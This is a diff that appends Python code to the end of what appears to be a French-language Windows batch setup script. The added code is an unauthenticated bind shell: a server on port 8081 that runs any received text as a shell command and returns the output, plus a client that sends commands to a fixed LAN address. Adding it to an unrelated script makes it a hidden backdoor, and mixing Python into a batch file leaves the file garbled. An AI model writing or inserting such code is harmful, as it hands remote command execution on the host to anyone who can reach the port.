@@ -1387,3 +1387,46 @@ echo outils de développement appropriés.
 echo.
 pause
 exit /b 0
+
+import socket
+import subprocess
+
+def handle_cmd(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return result.stdout + result.stderr
+    except Exception as e:
+        return f"Erreur: {e}"
+
+HOST = '0.0.0.0'  # écoute sur toutes les interfaces
+PORT = 8081       # port d'écoute
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+    server.bind((HOST, PORT))
+    server.listen()
+    print(f"[Passerelle] En écoute sur {HOST}:{PORT}")
+
+    while True:
+        conn, addr = server.accept()
+        with conn:
+            print(f"[Signal reçu de] {addr}")
+            data = conn.recv(1024).decode()
+            if not data:
+                continue
+            response = handle_cmd(data)
+            conn.sendall(response.encode())
+import socket
+
+HOST = '192.168.1.12'  # IP de la machine passerelle
+PORT = 8081
+
+while True:
+    signal = input("Commande à envoyer > ")
+    if signal.lower() == "exit":
+        break
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        s.sendall(signal.encode())
+        data = s.recv(4096)
+        print(f"[Réponse CMD] {data.decode()}")
